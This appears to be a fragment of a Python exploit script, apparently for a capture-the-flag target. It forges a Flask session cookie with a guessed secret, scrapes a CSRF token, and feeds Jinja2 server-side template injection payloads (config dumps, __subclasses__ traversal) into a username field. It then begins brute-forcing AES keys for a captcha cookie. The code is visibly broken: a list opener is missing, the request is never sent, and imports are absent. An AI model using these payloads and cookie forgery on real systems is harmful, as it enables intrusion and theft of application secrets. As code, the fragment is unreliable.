import requests
import re
from flask_unsign import sign

target = "http://222.20.126.52:32870"
secret = 'secret'

session_cookie = sign({'csrf_token': 'test'}, secret)

s = requests.Session()
s.cookies.set('session', session_cookie)

# 获取页面和验证码
r = s.get(target)
csrf_token = re.search(r'csrf_token" type="hidden" value="([^"]+)"', r.text)
captcha_cookie = s.cookies.get('captcha')
print(f"CSRF Token: {csrf_token.group(1) if csrf_token else 'None'}")
print(f"Captcha cookie: {captcha_cookie}")

# 尝试SSTI payload在用户名字段

    "{{config}}",
    "{{self.__class__}}",
    "{{request.environ}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{config.items()}}",
]

for payload in ssti_payloads:
    data = {
        'csrf_token': csrf_token.group(1) if csrf_token else 'test',
        'username': payload,
        'captcha': 'test',
        'submit': 'Create User'
    }

    print(f"\nPayload: {payload[:30]}...")

from Crypto.Cipher import AES

data = base64.b64decode(captcha_cookie)

key_methods = [
    ('md5', lambda s: hashlib.md5(s.encode()).digest()),
    ('sha256[:16]', lambda s: hashlib.sha256(s.encode()).digest()[:16]),
    ('sha256[:32]', lambda s: hashlib.sha256(s.encode()).digest()),
    ('plain md5', lambda s: s.encode()[:16] if len(s) >= 16 else s.encode().ljust(16, b'\x00')),
]
